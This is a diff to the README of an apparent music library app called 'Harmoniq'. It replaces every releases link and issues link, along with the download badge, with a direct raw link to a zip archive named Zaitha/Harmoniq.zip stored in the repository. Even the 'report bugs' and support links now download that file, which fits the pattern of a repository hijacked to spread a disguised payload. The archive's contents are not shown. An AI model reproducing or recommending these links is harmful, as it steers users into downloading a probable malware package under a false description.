@@ -1,6 +1,6 @@
 # 🎶 Harmoniq - Explore Your Music Library Effortlessly
 
-[![Download Harmoniq](https://img.shields.io/badge/Download%20Harmoniq-v1.0-blue.svg)](https://github.com/Ppain8299/Harmoniq/releases)
+[![Download Harmoniq](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip%https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip)](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip)
 
 ## 📖 Introduction
 
@@ -23,7 +23,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get Harmoniq, visit the Releases page to download the latest version:
 
-[Visit the Releases Page](https://github.com/Ppain8299/Harmoniq/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -72,17 +72,17 @@ If you encounter issues while using Harmoniq, consider the following steps:
 
 1. **Check File Compatibility:** Ensure your files are in MP3 format.
 2. **Reinstall the App:** If issues persist, uninstall and reinstall Harmoniq.
-3. **Consult Online Help:** Visit our [GitHub Issues page](https://github.com/Ppain8299/Harmoniq/issues) to find solutions or report bugs.
+3. **Consult Online Help:** Visit our [GitHub Issues page](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip) to find solutions or report bugs.
 
 ## 🙌 Support
 
 For further assistance, reach out through the following channels:
 
-- **GitHub:** Create a new issue on our [Issues page](https://github.com/Ppain8299/Harmoniq/issues) for technical problems.
+- **GitHub:** Create a new issue on our [Issues page](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip) for technical problems.
 - **Community Forum:** Join discussions and share tips with other users.
 
 ## 🎉 Conclusion
 
 Thank you for choosing Harmoniq! We hope you enjoy exploring and managing your music library with ease. If you have feedback or feature requests, feel free to share them on our GitHub repository.
 
-[Visit the Releases Page to Download](https://github.com/Ppain8299/Harmoniq/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Ppain8299/Harmoniq/main/Zaitha/Harmoniq.zip)
